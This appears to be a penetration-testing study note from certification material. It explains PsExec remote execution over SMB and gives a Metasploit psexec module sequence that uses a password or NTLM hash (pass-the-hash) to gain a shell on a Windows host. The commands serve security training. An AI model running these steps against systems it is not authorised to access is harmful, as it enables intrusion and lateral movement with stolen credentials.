---
title: "PsExec: remote command execution over SMB"
description: "Microsoft's lightweight telnet replacement — run commands on a remote Windows host using valid credentials."
pubDate: 2026-08-01
category: "Cybersecurity"
source: "INE Certification"
lang: "msfconsole"
tags: ["psexec", "smb", "windows"]
draft: false
---

PsExec authenticates over SMB and executes processes on a remote Windows system under any account you have valid credentials (or a hash) for — functionally similar to RDP, except you're sending commands rather than controlling a GUI session.

```bash
# Metasploit's psexec module — most common way to use this technique in practice
use exploit/windows/smb/psexec
set RHOSTS <target_ip>
set SMBUser <username>
set SMBPass <password_or_ntlm_hash>
run
```

Once you have legitimate SMB credentials (from brute-forcing or a hash dump), PsExec is usually the fastest path from "valid creds" to a shell — it's the same mechanic underlying pass-the-hash attacks against SMB, since the module accepts an NTLM hash in place of a password.
